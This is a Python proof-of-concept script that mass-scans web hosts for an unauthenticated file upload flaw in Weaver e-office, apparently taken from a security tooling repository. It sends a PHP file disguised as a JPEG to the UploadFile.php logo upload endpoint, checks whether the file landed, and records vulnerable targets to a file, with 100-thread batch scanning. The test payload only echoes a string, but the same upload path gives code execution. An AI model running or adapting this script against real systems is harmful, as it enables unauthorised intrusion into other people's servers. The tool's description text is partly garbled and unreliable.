import argparse,requests,sys,time,re,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m' #输出颜色
RESET = '\033[0m'
def banner():
    text="""       ____.__            ____.__        
    |    |__| ____     |    |__| ____  
    |    |  |/ __ \    |    |  |/ __ \ 
/\__|    |  \  ___//\__|    |  \  ___/ 
\________|__|\___  >________|__|\___  >
                 \/                 \/ 

     
writer:杰杰宝贝
"""
    print(text)
def main():
    banner()
    parser = argparse.ArgumentParser(description='Pan Micro - Orpheus Upu Lodifi. Fiber background file upload vulnerability')
    parser.add_argument('-u','--url',dest='url',type=str,help="your one url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file name ')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        urllist = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                urllist.append(url.strip())
        mp = Pool(100)
        mp.map(poc,urllist)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):

    payload = "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
    headers = {
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/86.0.4240.111Safari/537.36',
        'Accept-Encoding':'gzip,deflate',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Connection':'close',
        'Accept-Language':'zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6',
        'Content-Length':'192',
        'Content-Type':'multipart/form-data;boundary=e64bdf16c554bbc109cecef6451c26a4',
    }
    data = '''--e64bdf16c554bbc109cecef6451c26a4
Content-Disposition: form-data; name="Filedata"; filename="test.php"
Content-Type: image/jpeg

<?php echo jj123?>

--e64bdf16c554bbc109cecef6451c26a4--'''
    proxy = {
            'http':'http://127.0.0.1:8080',
            'https':'http://127.0.0.1:8080'
        }
    try:
        res = requests.post(url=target+payload,headers=headers,data=data,verify=False,proxies=proxy)
        path = f"{target}/images/logo/logo-eoffice.php"
        if 'logo-eoffice.php' == res.text:
            print(f"{GREEN}[+]{target}-----A file upload vulnerability exists{RESET}")
            print(f"{GREEN}[+]请访问{path}{RESET}")
            with open ('fw.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')

        else:
            print(f"[-]{target}-----There is no file upload vulnerability")
    except Exception as e:
        print(f"{target}There is a problem with your website, please test it manually")
        print(f"error message: {str(e)}")


if __name__ == '__main__' :
    main()